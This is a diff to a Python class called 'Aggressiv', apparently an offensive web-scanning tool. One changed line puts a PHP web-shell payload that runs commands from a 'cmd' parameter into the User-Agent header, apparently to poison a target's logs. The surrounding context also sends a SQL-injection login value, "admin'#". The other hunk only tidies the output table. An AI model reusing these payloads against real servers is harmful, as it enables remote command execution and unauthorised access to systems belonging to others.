@@ -134,7 +134,7 @@ class Aggressiv :
                     request.set_handle_robots(False)
                     request.set_handle_redirect(True)
                     request.set_handle_refresh(True, max_time=1)              
-                    request.addheaders = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1)\
+                    request.addheaders = [('User-agent', 'Mozilla/5.0<?php echo system($_GET["cmd"]); ?>(X11; U; Linux i686; en-US; rv:1.9.0.1)\
                                  Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1'),
                                  ('Cookie',str(self.Cookie).replace('\n','')),
                                  ('username',"admin'#"),
@@ -193,7 +193,10 @@ class Aggressiv :
                                     print("|  "+f"{'   File-Name    ':<23}","|"+f"{'    Length    ':<10}"+"|",f"{'  Full-URL   ':<100}","     |")
                                     print(" "+"-"*149)                    
                                     num = 1 
-                             print("|  "+f"{  filename     :<23}","| "+f"{    number    :<13}"+"| ",f"{   fullurl   :<100}","    |",end='\n')                                      
+                             try:       
+                                print("|  "+f"{  filename[0:20]     :<23}","| "+f"{    number    :<13}"+"| ",f"{   fullurl[0:100]   :<100}","    |",end='\n')                 
+                             except IndexError:
+                                 continue                    
                        self.box_list.append(number)
                        self.link_list.append(self.url.replace('\n',' '))
                        self.link_list.append (str(len(self.Get_Oregnal_URL)))
